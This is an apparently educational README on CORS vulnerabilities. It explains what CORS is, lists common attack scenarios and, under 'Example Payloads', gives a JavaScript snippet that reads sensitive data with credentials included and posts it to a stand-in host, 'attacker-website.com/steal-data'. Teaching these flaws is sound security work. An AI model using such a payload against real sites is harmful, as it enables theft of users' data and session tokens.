# Cross-Origin Resource Sharing (CORS)

This repository is dedicated to exploring Cross-Origin Resource Sharing (CORS) vulnerabilities, providing examples of common CORS attacks and payloads, and offering strategies for prevention. This learning path is inspired by content from [web-security-academy.net](https://portswigger.net/web-security) and [Rana Khalil](https://ranakhalil.com/), and it aims to enhance your understanding of CORS.

## Introduction to CORS

Cross-Origin Resource Sharing (CORS) is a security feature implemented by web browsers to control how resources from one domain can be requested by another domain. It is designed to protect web applications from unauthorized access to resources on different domains. However, when improperly configured, CORS can introduce vulnerabilities that allow attackers to bypass these restrictions and access sensitive data.

## Common CORS Attack Scenarios

1. **Exploiting Misconfigured CORS Policies**: An attacker accesses sensitive information from a different domain due to overly permissive CORS settings.
2. **Stealing User Data**: An attacker retrieves personal information like user details, session tokens, or other sensitive data by exploiting CORS flaws.
3. **Performing Unauthorized API Requests**: An attacker leverages a vulnerable CORS policy to make unauthorized API calls on behalf of a user.
4. **Bypassing Same-Origin Policy**: An attacker circumvents the browser’s same-origin policy, allowing them to execute scripts from a different origin.

## Example Payloads

### Stealing Sensitive Data

```javascript
// Malicious JavaScript Code
fetch("https://vulnerable-api.com/sensitive-data", {
    method: "GET",
    credentials: "include"
})
    .then((response) => response.text())
    .then((data) => {
        // Send stolen data to the attacker's server
        fetch("https://attacker-website.com/steal-data", {
            method: "POST",
            body: JSON.stringify({stolenData: data}),
            headers: {
                "Content-Type": "application/json"
            }
        });
    });
```
